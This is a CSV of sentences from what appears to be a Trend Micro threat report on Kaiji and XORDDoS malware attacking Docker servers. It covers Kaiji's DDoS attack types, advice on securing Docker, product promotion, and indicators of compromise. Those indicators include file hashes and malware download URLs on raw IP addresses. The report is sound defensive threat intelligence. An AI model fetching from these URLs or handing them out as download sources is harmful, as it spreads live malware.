Number,Content
Sentence 36,"

The payload linux_arm, which is the Kaiji DDoS malware, initiated the following DDoS attacks:

ACK attack
IPS spoof attack
SSH attack
SYN attack
SYNACK attack
TCP flood attack
UDP flood attack
This malware also gathered the following data, which it can use for the aforementioned attacks:

CPU Information
Directories
Domain Name
Host IP address
PID of Running Process
URL scheme
Defending Docker servers
As seen in these findings, threat actors behind malware variants constantly upgrade their creations with new capabilities so that they can deploy their attacks against other entry points."
Sentence 37,"As they are relatively convenient to deploy in the cloud, Docker servers are becoming an increasingly popular option for companies."
Sentence 38,"However, these also make them an attractive target for cybercriminals who are on the constant lookout for systems that they can exploit."
Sentence 39,"These are some recommendations for securing Docker servers:

Secure the container host."
Sentence 40,"Take advantage of monitoring tools, and host containers in a container-focused OS."
Sentence 41,Secure the networking environment.
Sentence 42,Use intrusion prevention system (IPS) and web filtering to provide visibility and observe internal and external traffic.
Sentence 43,Secure the management stack.
Sentence 44,Monitor and secure the container registry and lock down the Kubernetes installation.
Sentence 45,Secure the build pipeline.
Sentence 46,Implement a thorough and consistent access control scheme and install strong endpoint controls.
Sentence 47,Adhere to the recommended best practices.
Sentence 48,Use security tools to scan and secure containers.
Sentence 49,Security solutions are recommended for safeguarding Docker servers.
Sentence 50,"Trend Micro™ Hybrid Cloud Security is recommended for automated security and protection for physical, virtual, and cloud workloads."
Sentence 51,"This solution encompasses the following:

Trend Micro Cloud One™– for comprehensive visibility and protection against threats
Trend Micro Cloud One - Container Security– for automated container image and registry scanning that helps detect threats early on
Trend Micro Cloud One – Workload Security – for protecting new and existing workloads against even unknown threats using techniques such as machine learning and virtual patching
For security as software: Trend Micro Deep Security™ Software (workload and container security) and Trend Micro Deep Security Smart Check (container image security) for scanning container images and preventing further compromise
"
Sentence 52,"
Indicators of Compromise
Kaiji

File name	SHA 256	Trend Micro pattern detection
123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	Trojan.SH.KAIJI.A
linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	DDoS.Linux.KAIJI.A
Related URLs:

http://62.171.160.189/linux_arm
http://62.171.160.189/11/123.sh
XORDDoS and other malware variants found through the same URL

SHA 256	Trend Micro pattern detection
dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	Backdoor.Linux.XORDDOS.AE
6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	Backdoor.Linux.DOFLOO.AB
286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	Backdoor.Win32.SDDOS.A
Related URL:

http://122.51.133.49:10086/VIP"
